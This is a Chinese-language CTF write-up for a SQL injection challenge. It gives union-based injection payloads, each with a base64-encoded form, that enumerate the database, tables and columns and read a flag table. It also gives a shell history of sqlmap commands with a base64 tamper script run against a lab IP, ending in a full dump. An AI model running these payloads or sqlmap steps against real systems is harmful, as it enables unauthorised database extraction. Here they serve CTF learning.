# CTF-3 SQL注入

### 手动注入：

第一行是sql注入语句，第二行是经过base64编码后的数据

```sql
1 and 1=2 union select 1, database()
MSBhbmQgMT0yIHVuaW9uIHNlbGVjdCAxLCBkYXRhYmFzZSgp

1 and 1=2 union select version(), current_user()
MSBhbmQgMT0yIHVuaW9uIHNlbGVjdCB2ZXJzaW9uKCksIGN1cnJlbnRfdXNlcigp

1 and 1=2 union select 1, database()
MSBhbmQgMT0yIHVuaW9uIHNlbGVjdCAxLCBkYXRhYmFzZSgp

1 and 1=2 union select 1, group_concat(table_name) from information_schema.tables where table_schema='websec'
MSBhbmQgMT0yIHVuaW9uIHNlbGVjdCAxLCBncm91cF9jb25jYXQodGFibGVfbmFtZSkgZnJvbSBpbmZvcm1hdGlvbl9zY2hlbWEudGFibGVzIHdoZXJlIHRhYmxlX3NjaGVtYT0nd2Vic2VjJw==

1 and 1=2 union select 1, group_concat(column_name) from information_schema.columns where table_name='flag'
MSBhbmQgMT0yIHVuaW9uIHNlbGVjdCAxLCBncm91cF9jb25jYXQoY29sdW1uX25hbWUpIGZyb20gaW5mb3JtYXRpb25fc2NoZW1hLmNvbHVtbnMgd2hlcmUgdGFibGVfbmFtZT0nZmxhZyc=

1 union select 1,value from flag
MSB1bmlvbiBzZWxlY3QgMSx2YWx1ZSBmcm9tIGZsYWc=
```

其中select 1的1用作占位，group_concat是把很多字符串拼接成一个字符串。

关于current_user()查询到的root用户是否是真的root用户，其实可以这么考虑，如果我在数据库中有一个admin用户，我的密码是admin，如果别人找到漏洞能修改admin密码为123，那么admin用户还是管理员用户吗？（也即用户名如果是root，那么必定是root用户，除非有两个表，一个表存储管理员用户，另一个存储普通用户，那么在普通用户表中可以有一个叫root的用户，但mysql的information_schema不是这样的）

此处存疑：可以通过爆破用户表查看，如果只有一个用户，那么必定是管理员吧。

### sqlmap：

使用sqlmap的经过如下（具体操作详见视频）：

```shell
 2002  sqlmap -u http://124.16.71.70:40005/?id=MQ%3d%3d --tamper=base64encode.py --dbs
 2003  sqlmap -u http://124.16.71.70:40005/?id=MQ%3d%3d --dbms=mysql  --dbs 
 2004  sqlmap -u http://124.16.71.70:40005/?id=MQ%3d%3d --dbms=mysql --tamper base64encode.py  --dbs 
 2005  sqlmap -u http://124.16.71.70:40005/?id=MQ%3d%3d --tamper base64encode.py --current-db
 2006  sqlmap -u http://124.16.71.70:40005/?id=MQ%3d%3d --dbms=mysql --tamper base64encode.py  --current-db
 2007  sqlmap -u "http://124.16.71.70:40005/?id=MQ%3d%3d" --tamper base64encode.py --current-db
 2008  sqlmap -u "http://124.16.71.70:40005/?id=MQ%3d%3d" --tamper base64encode.py --level
 2009  sqlmap -u "http://124.16.71.70:40005/?id=MQ%3d%3d" --tamper base64encode.py --level=5
 2010  sqlmap -u "http://124.16.71.70:40005/?id=MQ%3d%3d" --tamper base64encode.py --level=5 --current-db --dbs
 2011  sqlmap -u "http://124.16.71.70:40005/?id=MQ%3d%3d" --tamper base64encode.py --level=5 -D websec --tables
 2012  sqlmap -u "http://124.16.71.70:40005/?id=MQ%3d%3d" --tamper base64encode.py --level=5 -D websec -T flag
 2013  sqlmap -u "http://124.16.71.70:40005/?id=MQ%3d%3d" --tamper base64encode.py --level=5 -D websec -T flag --columns
 2014  sqlmap -u "http://124.16.71.70:40005/?id=MQ%3d%3d" --tamper base64encode.py --level=5 -D websec -T flag -C value
 2015  sqlmap -u "http://124.16.71.70:40005/?id=MQ%3d%3d" --tamper base64encode.py --level=5 -D websec -T flag -C value --dump
```

